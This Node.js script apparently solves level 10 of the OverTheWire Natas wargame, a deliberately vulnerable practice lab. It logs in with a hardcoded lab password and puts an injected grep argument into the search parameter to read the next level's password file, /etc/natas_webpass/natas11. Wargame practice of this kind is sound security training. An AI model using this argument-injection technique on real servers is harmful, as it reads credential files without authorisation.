const http = require('http');
const fs = require('fs');
const querystring = require('querystring');

let username = 'natas10';
let password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu';

let options = {
    host: `${username}.natas.labs.overthewire.org`,
    path: '/?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search',
    auth: `${username}:${password}`,
}

let request = http.request(options, (res) => {
    res.setEncoding('utf8');
    res.on('data', data => {
        fs.writeFile('index.html', data, () => {});
        //console.log(data.match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0]);
    });
});

request.on('error', error => {
    console.log(error)
});

request.end();
